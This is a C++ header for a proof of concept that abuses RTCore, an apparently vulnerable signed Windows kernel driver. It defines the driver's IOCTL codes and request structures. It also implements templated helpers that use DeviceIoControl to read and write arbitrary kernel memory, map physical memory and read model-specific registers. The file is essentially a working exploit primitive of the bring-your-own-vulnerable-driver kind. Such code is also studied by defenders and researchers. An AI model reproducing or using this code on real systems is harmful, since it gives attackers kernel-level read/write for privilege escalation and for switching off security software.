#pragma once
#include <Windows.h>

#define FILE_DEVICE_RTCORE 0x8000

#define IOCTL_MAP_PHYSICAL_SET			CTL_CODE(FILE_DEVICE_RTCORE, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS) // 80002000
#define IOCTL_UNMAP_PHYSICAL_SET		CTL_CODE(FILE_DEVICE_RTCORE, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS) // 80002004
#define IOCTL_READ_IO_PORT_BYTE_SET		CTL_CODE(FILE_DEVICE_RTCORE, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS) // 80002008
#define IOCTL_READ_IO_PORT_WORD_SET		CTL_CODE(FILE_DEVICE_RTCORE, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS) // 8000200C
#define IOCTL_READ_IO_PORT_DWORD_SET	CTL_CODE(FILE_DEVICE_RTCORE, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS) // 80002010
#define IOCTL_WRITE_IO_PORT_BYTE_SET	CTL_CODE(FILE_DEVICE_RTCORE, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS) // 80002014
#define IOCTL_WRITE_IO_PORT_WORD_SET	CTL_CODE(FILE_DEVICE_RTCORE, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS) // 80002018
#define IOCTL_WRITE_IO_PORT_DWORD_SET	CTL_CODE(FILE_DEVICE_RTCORE, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS) // 8000201C
#define IOCTL_INIT_DATA_SET				CTL_CODE(FILE_DEVICE_RTCORE, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS) // 80002028
#define IOCTL_UNK_UPDATE_VAL			CTL_CODE(FILE_DEVICE_RTCORE, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS) // 8000202C
#define IOCTL_READ_MSR_SET				CTL_CODE(FILE_DEVICE_RTCORE, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS) // 80002030
#define IOCTL_WRITE_MSR_SET				CTL_CODE(FILE_DEVICE_RTCORE, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS) // 80002034
#define IOCTL_MAP_PHYSICAL_SYSTEM_SET	CTL_CODE(FILE_DEVICE_RTCORE, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS) // 80002040
#define IOCTL_UNMAP_PHYSICAL_SYSTEM_SET CTL_CODE(FILE_DEVICE_RTCORE, 0x811, METHOD_BUFFERED, FILE_ANY_ACCESS) // 80002044
#define IOCTL_READ_SET					CTL_CODE(FILE_DEVICE_RTCORE, 0x812, METHOD_BUFFERED, FILE_ANY_ACCESS) // 80002048
#define IOCTL_WRITE_SET					CTL_CODE(FILE_DEVICE_RTCORE, 0x813, METHOD_BUFFERED, FILE_ANY_ACCESS) // 8000204C
#define IOCTL_GET_PCI_CONF_SET			CTL_CODE(FILE_DEVICE_RTCORE, 0x814, METHOD_BUFFERED, FILE_ANY_ACCESS) // 80002050
#define IOCTL_SET_PCI_CONF_SET			CTL_CODE(FILE_DEVICE_RTCORE, 0x815, METHOD_BUFFERED, FILE_ANY_ACCESS) // 80002054


#define VERIFY_RANGE(addr, bytes) (addr >= 0xC0000 && addr + bytes <= 0xE0000 )


struct RTCore_MapSystem // For mapping (MmMapIoSpace)
{
	PVOID baseAddress; // 0x00
	PVOID virtualAddr;  // 0x08
	DWORD numberOfBytes;  // 0x10
	DWORD64 e;  // 0x18
	LPVOID busInf;  // 0x20
	DWORD64 g;  // 0x28
};  // 0x30


struct RTCore_MSR // For read/write to MSR
{
	DWORD reg; // 0x00
	DWORD hightVal; // 0x04
	DWORD lowVal; // 0x08
}; // 0x0C


#pragma pack(push, 1)
struct RTCore_Memory // For Read/Write memory operations
{
	DWORD64 _pad0; // 0x00
	LPVOID addr; // 0x08
	DWORD _pad1; // 0x10
	DWORD offset; // 0x14
	DWORD size; // 0x18
	DWORD val; // 0x1C
	DWORD _pad2; // 0x20
	DWORD64 _pad3; // 0x24
	DWORD _pad4; // 0x2C
}; // 0x30

struct BusInf // Physical addr information
{
	ULONG busNumber; // 0x00
	ULONG slotNumber_0; // 0x04
	ULONG slotNumber_1; // 0x08
	ULONG offset; // 0x0C
	DWORD len; // 0x10
	PVOID buffer; // 0x14
}; // 0x20

struct RTCore_MapProc // For mapping (ZwMapViewOfSection)
{
	PVOID baseAddress; // 0x00
	DWORD numberOfBytes; // 0x08
	BusInf* busInf; // 0x0C ( Not used )
	DWORD64 _a; // 0x14 ( Not used )
	DWORD _b; // 0x1C ( Not used )
}; // 0x20
#pragma pack(pop)


// only needed functions for POC are defined here ! 
namespace sdk
{

	// Open Device handle
	HANDLE getRTCoreHandle();

	// Read from memory
	template <typename T>
	T readMemory(const HANDLE _In_& hDevice, const PVOID _In_ address, BOOL _Out_& status, const DWORD _In_& offset = 0)
	{
		T value;
		DWORD bytes{};

		bool bMore = (sizeof(T) == 8) ? true : false;

		RTCore_Memory rtmem;
		rtmem.addr = address;
		rtmem.offset = offset;
		rtmem.size = min(sizeof(T), 4);
		

		status = DeviceIoControl(hDevice, IOCTL_READ_SET, &rtmem, sizeof(rtmem), &rtmem, sizeof(rtmem), &bytes, nullptr);

		value = rtmem.val;

		if (bMore)
		{
			rtmem.offset = 4;
			status = DeviceIoControl(hDevice, IOCTL_READ_SET, &rtmem, sizeof(rtmem), &rtmem, sizeof(rtmem), &bytes, nullptr);
			value = ((DWORD64)rtmem.val << 32) | value;

		}
		return value;

	}
	
	// Write to memory
	template <typename T>
	void writeMemory(const HANDLE _In_& hDevice, const PVOID _In_ address, const T _In_ &value, BOOL _Out_& status, const DWORD _In_& offset = 0)
	{
		DWORD bytes{};

		bool bMore = (sizeof(T) == 8) ? true : false;

		RTCore_Memory rtmem;
		rtmem.addr = address;
		rtmem.offset = offset;
		rtmem.size = min(sizeof(T), 4);
		rtmem.val = value;

		status = DeviceIoControl(hDevice, IOCTL_WRITE_SET, &rtmem, sizeof(rtmem), &rtmem, sizeof(rtmem), &bytes, nullptr);

		if (bMore)
		{
			rtmem.offset = 4;
			rtmem.val = (DWORD64)value >> 32;
			status = DeviceIoControl(hDevice, IOCTL_WRITE_SET, &rtmem, sizeof(rtmem), &rtmem, sizeof(rtmem), &bytes, nullptr);
		}

		return;

	}

	// Map in the process user-space
	extern PVOID mapPhysical(const HANDLE _In_& hDevice, const PVOID _In_& address, const DWORD _In_& numberOfBytes, BOOL _Out_& status);

	// unmap the mapped user-space address
	extern void unmapPhysical(const HANDLE _In_& hDevice, const PVOID _In_& address, BOOL _Out_& status);

	// Map in the system-space
	extern PVOID mapPhysicalSystem(const HANDLE _In_& hDevice, const PVOID _In_& address, const DWORD _In_& numberOfBytes, BOOL _Out_& status);

	// unmap the mapped system-space address
	extern void unmapPhysicalSystem(const HANDLE _In_& hDevice, const PVOID _In_& address, const DWORD _In_& numberOfBytes, BOOL _Out_& status);

	// read MSR 
	extern DWORD64 readMSR(const HANDLE _In_& hDevice, const DWORD _In_& reg, BOOL _Out_& status);
}